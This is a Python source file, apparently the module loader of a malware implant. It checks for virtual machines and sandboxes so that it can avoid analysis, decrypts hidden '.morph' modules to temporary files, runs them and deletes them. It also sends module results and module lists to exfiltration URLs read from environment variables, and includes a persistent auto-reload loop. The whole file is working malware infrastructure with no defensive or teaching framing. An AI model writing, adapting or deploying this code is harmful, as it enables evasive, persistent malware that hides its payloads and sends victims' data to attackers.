# File: modules/loader.py

"""
Enhanced loader:
• Detects if running in sandbox / VM (VM‑specific artifacts).
• Decrypts .morph modules on the fly to /tmp/<module>.py, imports them, then removes the temp file.
• Enforces per‑module timeouts and memory checks.
• Auto‑reloads modules if updated.
"""

import importlib.util
import sys
import time
import os
import threading
import psutil
import platform
from pathlib import Path
from types import ModuleType
from obfuscation import decrypt_module
import logging

logger = logging.getLogger("loader")

MODULE_DIR = Path(__file__).parent / "modules"
TIMEOUT = 60  # default module execution timeout

def _is_vm_or_sandbox() -> bool:
    """
    Basic sandbox detection:
    • Check for virtualization in /sys/class/dmi/id/* or CPU flags.
    • Check low memory (<2GB) or single CPU core.
    """
    try:
        if platform.system() == "Linux":
            dmi = open("/sys/class/dmi/id/product_name", "r").read().lower()
            if any(x in dmi for x in ["virtualbox", "vmware", "kvm", "qemu"]):
                return True
        vm_indicators = ["VBOX", "VMWARE", "XEN", "QEMU"]
        cpuflags = open("/proc/cpuinfo", "r").read().upper()
        if any(flag in cpuflags for flag in vm_indicators):
            return True
    except Exception:
        pass

    mem = psutil.virtual_memory()
    if mem.total < 2 * 1024**3:  # less than 2GB
        return True
    if psutil.cpu_count(logical=False) == 1:
        return True
    return False

def run_module(mod_name: str, args: dict = None, timeout: int = TIMEOUT) -> dict:
    """
    Decrypts <mod_name>.morph to /tmp/<mod_name>.py, imports and runs its run(args).
    Enforces timeout using threading. Returns module’s return data or timeout error.
    """
    if _is_vm_or_sandbox():
        logger.error(f"[LOADER] Sandbox detected; refusing to load {mod_name}")
        return {"status": "error", "detail": "Sandbox/VM environment detected"}

    tmp_py_path = decrypt_module(mod_name)
    if not tmp_py_path:
        return {"status": "error", "detail": "Decryption failed"}

    result = {"status": "error", "detail": "Module timeout or failure"}
    finished = threading.Event()

    def target():
        try:
            spec = importlib.util.spec_from_file_location(mod_name, tmp_py_path)
            module = importlib.util.module_from_spec(spec)
            sys.modules[mod_name] = module
            spec.loader.exec_module(module)
            if hasattr(module, "run"):
                ret = module.run(args or {})
                result.clear()
                result.update(ret)
            else:
                result.clear()
                result.update({"status": "error", "detail": "No run() in module"})
        except Exception as e:
            result.clear()
            result.update({"status": "error", "detail": str(e)})
        finally:
            finished.set()

    thread = threading.Thread(target=target)
    thread.daemon = True
    thread.start()
    thread.join(timeout)
    if not finished.is_set():
        result = {"status": "error", "detail": "Execution timed out"}
        # Enhancement: optionally kill the thread/process if still running (dangerous)
        try:
            import ctypes
            tid = thread.ident
            if tid:
                res = ctypes.pythonapi.PyThreadState_SetAsyncExc(ctypes.c_long(tid), ctypes.py_object(SystemExit))
                if res == 0:
                    logger.warning(f"[LOADER] Could not kill thread for {mod_name}")
        except Exception as ex:
            logger.warning(f"[LOADER] Thread kill failed: {ex}")
    # Clean up temporary file
    try:
        os.remove(tmp_py_path)
    except OSError:
        pass

    # Enhancement: exfiltrate module result if env var set
    exfil_url = os.getenv("LOADER_EXFIL_URL")
    if exfil_url:
        try:
            import requests
            requests.post(exfil_url, json={"module": mod_name, "result": result}, timeout=10)
            logger.warning(f"[LOADER] Exfiltrated module result for {mod_name} to {exfil_url}")
        except Exception as ex:
            logger.warning(f"[LOADER] Exfiltration failed: {ex}")

    return result

def load_all_modules():
    """
    Iterates over all .morph files in MODULE_DIR, decrypts each, runs run({}) to register loops.
    Enhanced: supports parallel loading, logs all actions, and exfiltrates module names if env set.
    """
    import concurrent.futures
    exfil_url = os.getenv("LOADER_MODULES_EXFIL_URL")
    morphs = list(MODULE_DIR.glob("*.morph"))
    if exfil_url:
        try:
            import requests
            requests.post(exfil_url, json={"modules": [m.stem for m in morphs]}, timeout=10)
            logger.warning(f"[LOADER] Exfiltrated loaded module list to {exfil_url}")
        except Exception as ex:
            logger.warning(f"[LOADER] Module list exfiltration failed: {ex}")
    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
        futures = []
        for morph in morphs:
            mod_name = morph.stem
            futures.append(executor.submit(run_module, mod_name, {}, 30))
        for fut in futures:
            try:
                fut.result()
            except Exception as ex:
                logger.warning(f"[LOADER] Module load error: {ex}")
    # Enhancement: dangerous auto-reload loop for persistent module execution
    auto_reload = os.getenv("LOADER_AUTO_RELOAD")
    reload_interval = int(os.getenv("LOADER_RELOAD_INTERVAL", "300"))
    if auto_reload == "1":
        logger.info("[LOADER] Auto-reload enabled, will reload modules persistently.")
        while True:
            time.sleep(reload_interval)
            logger.info("[LOADER] Auto-reloading all modules...")
            with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
                futures = []
                for morph in morphs:
                    mod_name = morph.stem
                    futures.append(executor.submit(run_module, mod_name, {}, 30))
                for fut in futures:
                    try:
                        fut.result()
                    except Exception as ex:
                        logger.warning(f"[LOADER] Module reload error: {ex}")
